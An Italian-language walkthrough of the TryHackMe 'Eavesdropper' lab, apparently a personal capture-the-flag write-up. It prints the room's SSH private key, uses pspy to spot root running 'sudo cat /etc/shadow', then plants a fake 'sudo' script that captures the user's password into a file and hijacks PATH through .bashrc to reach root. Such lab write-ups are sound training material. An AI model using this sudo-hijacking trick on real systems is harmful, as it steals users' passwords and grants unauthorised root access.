
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/eavesdropper

Ascolta attentamente, potresti sentire una password!

Salve di nuovo, hacker. Dopo aver scoperto la chiave privata SSH di un utente, Frank , sei entrato in un ambiente di destinazione.

**Scaricare la chiave privata SSH allegata.**

**Nota:** se si utilizza AttackBox, è possibile copiare e incollare la chiave privata SSH utilizzando l'icona "Appunti" situata nel vassoio scorrevole, come mostrato nella GIF qui sotto:

```
nano id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
F5iAvxBl12p5cAAAAKam9obkBhbGllbgE=
-----END OPENSSH PRIVATE KEY-----
```

```
chmod 600 id_rsa
```
Hai accesso a `frank`, ma vuoi essere `root`! Come puoi aumentare i privilegi? Se ascolti attentamente, forse puoi scoprire qualcosa che potrebbe aiutarti!


```
nmap -O -v -Pn 10.10.119.132
```
```
PORT   STATE SERVICE
22/tcp open  ssh
```
Ci connettiamo con ssh
```
ssh -i id_rsa frank@10.10.119.132
```

```
ls -al
```
```
frank@workstation:~$ ls -al
total 36
drwxr-xr-x 1 frank frank 4096 Mar 14  2022 .
drwxr-xr-x 1 root  root  4096 Mar 14  2022 ..
lrwxrwxrwx 1 frank frank    9 Mar 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 frank frank 3771 Feb 25  2020 .bashrc
drwx------ 2 frank frank 4096 Mar 14  2022 .cache
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwxr-xr-x 1 frank frank 4096 May 16 13:10 .ssh
-rw-r--r-- 1 frank frank    0 Mar 14  2022 .sudo_as_admin_successful

```

```
id
```
```
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
```
Frank fa parte del gruppo sudo. Ma non conosciamo la sua password

Vediamo i processi in esecuzione
```
frank@workstation:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.7  12172  7208 ?        Ss   12:02   0:00 sshd: /usr/sbin/sshd -D [listener] 0 
root        4510  0.0  0.9  13580  8832 ?        Ss   12:44   0:00 sshd: frank [priv]
frank       4521  0.0  0.5  13904  5336 ?        R    12:44   0:00 sshd: frank@pts/0
frank       4522  0.0  0.4   5992  3916 pts/0    Ss   12:44   0:00 -bash
frank       7322  0.0  0.5   9268  5852 pts/0    S+   13:10   0:00 ssh -i id_rsa frank@workstation
root        7323  0.0  0.8  13580  8668 ?        Ss   13:10   0:00 sshd: frank [priv]
frank       7334  0.0  0.5  13908  5280 ?        R    13:10   0:00 sshd: frank@pts/1
frank       7335  0.0  0.3   5992  3856 pts/1    Ss   13:10   0:00 -bash
frank      10814  0.0  0.3   7644  3164 pts/1    R+   13:42   0:00 ps aux

```

Utilizziamo lo [script pspy](https://github.com/DominicBreuker/pspy) per elencare i processi in esecuzione. Lo script ci permette di visualizzare i processi in esecuzione di tutti gli utenti senza privilegi sudo. Scarica lo script sul tuo computer.

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

avvia un server web Python sulla tua macchina Kali con il seguente comando.

```
python3 -m http.server 8080
```

Ora, scarica lo script dal computer di destinazione.

```
wget http://10.10.31.120:8080/pspy64
```

```
chmod +x pspy64
```

```
./pspy64
```

```
2025/05/16 14:09:52 CMD: UID=1000  PID=13752  | /bin/sh /etc/init.d/ssh status 
2025/05/16 14:09:52 CMD: UID=1000  PID=13753  | /bin/sh /etc/init.d/ssh status 
2025/05/16 14:09:52 CMD: UID=1000  PID=13755  | /bin/sh /usr/sbin/service --status-all 
2025/05/16 14:09:52 CMD: UID=???   PID=13754  | ???
2025/05/16 14:09:53 CMD: UID=1000  PID=13756  | 
2025/05/16 14:09:54 CMD: UID=1000  PID=13757  | 
2025/05/16 14:09:54 CMD: UID=0     PID=13758  | sudo cat /etc/shadow 

```

una volta che Frank accede tramite SSH, un comando **(sudo cat /etc/passwd)** viene eseguito da root con privilegi sudo

**Sudo Hijacking**
Creeremo un file sudo dannoso che registra la password e la salveremo in un file e aggiungeremo il percorso del file a $PATH. 
Controlliamo l'attuale $PATH.

```
echo $PATH
```
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
pwd
```
```
frank@workstation:~$ pwd
/home/frank
```

 file sudo falso che salva la password in un file  pass.txt
```
nano sudo
```
```
#!/bin/bash
# Ask the user for login details
read -sp 'Enter frank Password: ' passvar
echo $passvar > /home/frank/pass.txt
```
è uno script Bash che chiede all'utente di inserire una password e poi tenta di scrivere questa password in un file

diamo permessi di esecuzione
```
chmod +x sudo
```

Apriamo .bashrc ed aggiungiamo in alto la seguente riga

```
nano .bashrc
```
```
PATH=/home/frank:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

connettiamoci da un nuovo terminale in ssh per ottenere il file con la password
```
ssh -i id_rsa frank@10.10.119.132
```
```
cat pass.txt
```
```
frank@workstation:~$ ls
pass.txt  pspy64  pspy64.1  sudo
frank@workstation:~$ cat pass.txt
!@#frankisawesome2022%*
```
password ottenuta
```
!@#frankisawesome2022%*
```
Passiamo a root con la password ottenuta
```
sudo su
```

```
whoami
```
```
root
```

```
cd /root
```

```
ls
```

```
cat flag.txt
```

```
flag{xxxxxxxxxxxxxxxxxxxx}
```

